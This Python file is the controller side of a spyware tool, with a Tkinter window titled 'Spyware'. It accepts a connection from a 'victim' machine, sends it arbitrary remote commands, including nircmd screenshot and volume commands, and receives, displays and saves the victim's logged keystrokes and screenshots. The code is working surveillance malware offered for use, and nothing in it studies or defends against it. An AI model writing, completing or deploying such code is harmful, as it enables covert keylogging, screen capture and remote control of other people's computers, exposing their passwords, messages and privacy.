import socket
import tkinter as tk
from tkinter import ttk
from tkinter import scrolledtext
from PIL import ImageTk, Image
import threading
import time


class Victim:

    def __init__(self, connection, ip, port):
        self.connection = connection
        self.ip = ip
        self.port = port
        self.pressed_keys = []


class Server:

    def __init__(self, ip, port):
        self.master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.master.bind((ip, port))
        self.master.listen()

        print(f'Server listening on: {ip}:{port}\n')


    def wait_for_victim_to_connect(self):
        victim_conn, victim_attr = self.master.accept()
        print(f'Victim connected from: {victim_attr[0]}:{victim_attr[1]}\n')

        self.victim = Victim(victim_conn, *victim_attr)


    def send_msg(self, msg):
        self.victim.connection.send(str(len(msg)).encode('utf-8'))
        try:
            msg = msg.encode('utf-8')
            self.victim.connection.send(msg)
        except:
            self.victim.connection.send(msg)


    def recv_msg(self):
        try:
            size = self.victim.connection.recv(64).strip()
            if size.isdigit():
                msg = self.victim.connection.recv(int(size.decode('utf-8')))
            else:
                return 
        except:
            return

        try:
            msg = msg.decode('utf-8')
            return msg
        except:
            return msg
            

    def send_command_GUI(self, command):
        self.send_msg(command)


    def _send_command_to_victim(self):
        while True:
            command = input('Command to victim: ')
            self.send_msg(command)


    def send_command_to_victim(self):
        threading.Thread(target=self._send_command_to_victim, args=()).start()


    def _receive_data_from_victim(self, window):
        while True:
            message = self.recv_msg()
            try:
                if len(message) > 1000:
                    Helper_functions.handle_screenshot(screenshot=message)
                else:
                    self.handle_logged_key(key=message, window=window)
            except:
                continue


    def receive_data_from_victim(self, window):
        threading.Thread(target=self._receive_data_from_victim, args=(window, )).start()


    def handle_logged_key(self, key, window):
        window.logged_keys_textbox.insert(tk.END, key)
        self.victim.pressed_keys.append(key)


    def _write_logged_keys_to_file(self):
        while True:
            if self.victim.pressed_keys:
                with open('logged_keys.txt', 'a') as logged_keys:
                    logged_keys.write(''.join(self.victim.pressed_keys))
                self.victim.pressed_keys.clear()
            time.sleep(5)


    def write_logged_keys_to_file(self):
        threading.Thread(target=self._write_logged_keys_to_file, args=()).start()



class Window:

    def __init__(self, size, title, server):

        self.frame = tk.Tk()
        self.frame.geometry(size)
        self.frame.title(title)
        self.server = server

        self.style = ttk.Style()
        self.style.configure('TButton', font=('TimesNewRoman', 12))

        self.take_screenshot_button = ttk.Button(text='Take screenshot', style='TButton',\
                                        command=lambda: server.send_command_GUI('nircmd.exe savescreenshot screenshot.png'))
        self.take_screenshot_button.place(relx=0.04, rely=0.03)

        self.mute_system_volume_button = ttk.Button(text='Mute', style='TButton',\
                                        command=lambda: server.send_command_GUI('nircmd.exe mutesysvolume 1'))
        self.mute_system_volume_button.place(in_=self.take_screenshot_button, relx=1.2)

        self.unmute_system_volume_button = ttk.Button(text='Unmute', style='TButton',\
                                        command=lambda: server.send_command_GUI('nircmd.exe mutesysvolume 0'))
        self.unmute_system_volume_button.place(in_=self.mute_system_volume_button, rely=1.5)

        self.increase_system_volume_button = ttk.Button(text='Volume up', style='TButton',\
                                        command=lambda: server.send_command_GUI('nircmd.exe changesysvolume 5000'))
        self.increase_system_volume_button.place(in_=self.unmute_system_volume_button, rely=1.8)

        self.decrease_system_volume_button = ttk.Button(text='Volume down', style='TButton',\
                                        command=lambda: server.send_command_GUI('nircmd.exe changesysvolume -5000'))
        self.decrease_system_volume_button.place(in_=self.increase_system_volume_button, rely=1.5)

        self.logged_keys_label = ttk.Label(text='Keys pressed', font=('TimesNewRoman', 12))
        self.logged_keys_label.place(in_=self.take_screenshot_button, rely=6.2)

        self.logged_keys_textbox = scrolledtext.ScrolledText(wrap=tk.WORD, width=30, height=15, font=("Times New Roman", 12))
        self.logged_keys_textbox.place(in_=self.logged_keys_label, rely=1.2)

        self.send_command_button = ttk.Button(text='Send command', style='TButton')
        self.send_command_button.place(relx=0.04, rely=0.93)
        self.send_command_button.bind('<Button-1>', lambda event, server=self.server, window=self:\
                Helper_functions.send_command_through_GUI(event, server=server, window=self))

        self.command_entry = ttk.Entry(width=40, font=('TimesNewRoman', 15), justify='left')
        self.command_entry.place(in_=self.send_command_button, relx=1.3, rely=0.05)
        self.command_entry.bind('<Return>', lambda event, server=self.server, window=self:\
                Helper_functions.send_command_through_GUI(event, server=server, window=self))


class Helper_functions:

    @classmethod
    def handle_screenshot(cls, screenshot):
        with open('screenshot.png', 'wb') as pic:
            pic.write(screenshot)

            cls.display_screenshot()


    @staticmethod
    def display_screenshot():
        try:
            load_screenshot = Image.open('screenshot.png')
            load_screenshot = load_screenshot.resize((750, 500))
            render_screenshot = ImageTk.PhotoImage(load_screenshot)
            screenshot_image = ttk.Label(image=render_screenshot)
            screenshot_image.image = render_screenshot
            screenshot_image.place(relx=0.3, rely=0.05)
        except:
            print('Failed to load screenshot')


    @staticmethod
    def send_command_through_GUI(event, server, window):
        server.send_command_GUI(window.command_entry.get())
        window.command_entry.delete(0, tk.END)



def main():
    
    server = Server('192.168.1.105', 9999)
    server.wait_for_victim_to_connect()
    window = Window("1200x600", "Spyware", server)
    server.receive_data_from_victim(window)
#    server.send_command_to_victim()
    server.write_logged_keys_to_file()
    window.frame.mainloop()


if __name__ == '__main__':
    main()




